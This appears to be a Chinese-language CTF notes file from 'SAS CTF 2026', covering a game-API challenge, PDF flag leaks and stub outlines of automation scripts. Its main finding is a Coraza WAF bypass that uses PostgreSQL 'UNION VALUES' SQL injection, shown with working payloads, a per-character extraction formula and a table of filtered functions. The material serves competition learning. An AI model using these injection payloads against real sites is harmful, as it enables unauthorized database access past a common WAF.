# SAS CTF 2026 自动化经验

## 比赛概况

- 时间: 2026-06-06 12:00 UTC ~ 06-07 12:00 UTC (24h)
- 平台: ctf.thesascon.com
- 题目: 10道 (Sanity Files/Gav/Snaking/Kolobok/XOD/NaaS/Gatekeeper/Guba I-II/Cerum/JSculator)
- 最终成绩: 1/10 (Sanity Files 50pts)

## 核心技术发现

### 1. Coraza WAF绕过 — UNION VALUES

**原理**: OWASP CRS `@detectSQLi` 检测 `UNION SELECT` 但**不检测 `UNION VALUES`**

```sql
-- ✅ 完全绕过WAF
x' UNION VALUES(current_database())--
x' UNION VALUES(''||ASCII('A'))--  -- 返回65

-- ❌ 被拦截
x' UNION SELECT 'test'--           -- 403
```

**技术细节**:
- Coraza WAF检查 `ARGS_NAMES|ARGS` (GET参数)
- **不检查** Cookie/POST body/Header/JSON body
- PostgreSQL原生支持 `SELECT ... UNION VALUES (...)` 语法

**数据提取公式**:
```sql
-- 第N个字符 (N从0开始)
x' UNION VALUES(''||ASCII(left(right(current_database(),-N),1)))--
```

**WAF允许/拦截函数矩阵**:

| 状态 | 函数 |
|------|------|
| ✅ 允许 | `current_database()`, `current_setting()`, `current_user`, `pg_backend_pid()` |
| ✅ 允许 | `trim()`, `upper()`, `lower()`, `reverse()`, `initcap()` |
| ✅ 允许 | `left()`, `right()` ← substring替代品 |
| ✅ 允许 | `ASCII()` ← 仅直接调用，子查询中被拦 |
| ✅ 允许 | `set_config()`, `''||expr` 字符串拼接 |
| ❌ 拦截 | `substring()`, `replace()`, `regexp_replace()`, `translate()` |
| ❌ 拦截 | `length()`, `char_length()`, `octet_length()`, `strpos()`, `position()` |
| ❌ 拦截 | `pg_read_file()`, `lo_import()`, `lo_from_bytea()` |
| ❌ 拦截 | `dblink_connect()`, `dblink_exec()` |
| ❌ 拦截 | `(SELECT ...)` 子查询, `CASE WHEN` |

### 2. 游戏题API绕过 (Kolobok模式)

**API端点**:
- `GET /game_state` — 获取游戏状态
- `POST /move_manual` — 手动移动 (body: `{"dx":1,"dy":0}`)
- `POST /reset_game` — 重置游戏
- `GET /get_flag` — 获取flag

**方向映射**:
```python
{"left": {"dx":-1,"dy":0}, "right": {"dx":1,"dy":0},
 "up": {"dx":0,"dy":-1}, "down": {"dx":0,"dy":1}}
```

**关键PITFALL**:
- 手动进入出口被拦截，需用kernel走最后一步
- Kernel sandbox限制: 禁止`import`/`__name__`/三元表达式/`while`/`return`/`or`
- 只允许`for range`/`if`/`len`/索引访问

**Kernel代码生成**:
```python
def player_kernel(m, a, o):
    o[0] = 1  # 0=不动, 1=左, 2=右, 3=上, 4=下
```

### 3. PDF泄露Flag模式

CTF题目附件(PDF/文档)中可能包含**所有题目的flag列表**，作为"内部文档泄露"类题目。

```bash
mutool draw -F txt file.pdf 1 2>&1 | grep -i "SAS{"
strings file.pdf | grep -i "flag\|SAS{"
```

## 自动化模块设计

### waf_bypass.py

```python
class WAFBypass:
    ALLOWED_FUNCTIONS = ["current_database()", "current_setting()", ...]
    BLOCKED_FUNCTIONS = ["substring()", "replace()", ...]

    @staticmethod
    def union_values_bypass(base_url, param, target_expr, prefix="x' "):
        # 测试UNION VALUES绕过
        # 逐字符ASCII提取

    @staticmethod
    def detect_coraza_waf(url):
        # 检测是否使用Coraza WAF

class GameAPIBypass:
    DIRECTION_MAP = {"left": {"dx":-1,"dy":0}, ...}

    @staticmethod
    def discover_game_api(base_url):
        # 发现游戏API端点

    @staticmethod
    def bfs_path(start, goal, walls, enemies, grid_size):
        # BFS寻路算法
```

### game_auto.py

```python
class GameAutomation:
    def get_state(self) -> Optional[GameState]:
        # 获取游戏状态

    def move(self, direction: str) -> Optional[Dict]:
        # 移动游戏角色

    def find_path(self, start, goal, avoid_enemies=True):
        # BFS寻路

    def collect_stars(self, max_moves=400):
        # 自动收集所有星星

    def auto_play(self, max_moves=500) -> Optional[str]:
        # 自动玩游戏

class KernelGenerator:
    @staticmethod
    def generate_move_kernel(direction: str) -> str:
        # 生成单步移动kernel

    @staticmethod
    def generate_smart_kernel() -> str:
        # 生成智能kernel (避开敌人，收集星星)
```

### auto_ctf.py (智能调度引擎)

```python
class DecisionEngine:
    def detect_target_type(self, target: str) -> TargetType:
        # 自动识别目标类型

    def analyze_web_target(self, url: str) -> Dict:
        # Web目标分析流程

    def analyze_service_target(self, target: str) -> Dict:
        # 服务目标分析流程

    def analyze_binary_target(self, target: str) -> Dict:
        # 二进制目标分析流程

class WorkflowEngine:
    def auto_solve(self, target: str) -> CTFResult:
        # 一键自动化解题

    def batch_solve(self, targets: List[str]) -> List[CTFResult]:
        # 批量解题
```

## bash集成

```bash
# 新增命令
ctf auto-solve <target>          # 一键自动化解题
ctf batch-solve <targets.txt>    # 批量解题
ctf coraza-bypass <url> [param]  # Coraza WAF绕过
ctf game-auto <url>              # 游戏题自动化
ctf game-kernel <direction>      # 生成游戏kernel
ctf pdf-leak <url/file>          # PDF泄露检测
```

## 关键PITFALL

1. **bash函数必须在case语句之前定义** — 否则报"未找到命令"
2. **python3可能hang住** — 用`python`替代
3. **重复函数定义** — 修改ctf.sh时容易产生，用grep检查
4. **UNION VALUES不被WAF检测** — 这是Coraza的盲点
5. **手动进入游戏出口被拦截** — 需用kernel走最后一步
